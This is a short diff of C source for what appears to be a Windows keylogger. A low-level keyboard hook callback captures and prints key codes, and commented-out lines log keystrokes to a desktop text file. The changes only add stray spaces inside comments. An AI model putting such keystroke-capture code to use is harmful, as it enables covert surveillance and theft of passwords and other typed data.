@@ -20,7 +20,7 @@ LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
     KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
     DWORD   kCode = 0;
 
-    /*DWORD file = GetFileAttributes("C:\\Users\\r4mnesia\\Desktop\\log.txt");
+    /*DWORD file = G etFileAttributes("C:\\Users\\r4mnesia\\Desktop\\log.txt");
     if (file != INVALID_FILE_ATTRIBUTES)
     {
         // openfile 
@@ -51,7 +51,7 @@ LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
                 printf("%c", (char)pkey->vkCode);
                 //DBG("OOHH\n");
                 
-                /*BYTE keyboard_status[256];
+                /* BYTE keyboard_status[256];
                 WCHAR unicode_buff[8] = {0}; 
                 int unicode = ToUnicode(pkey->vkCode, pkey->scanCode, keyboard_status, unicode_buff, 8, 0);
                 DBG("Unicde: %d\n", unicode);
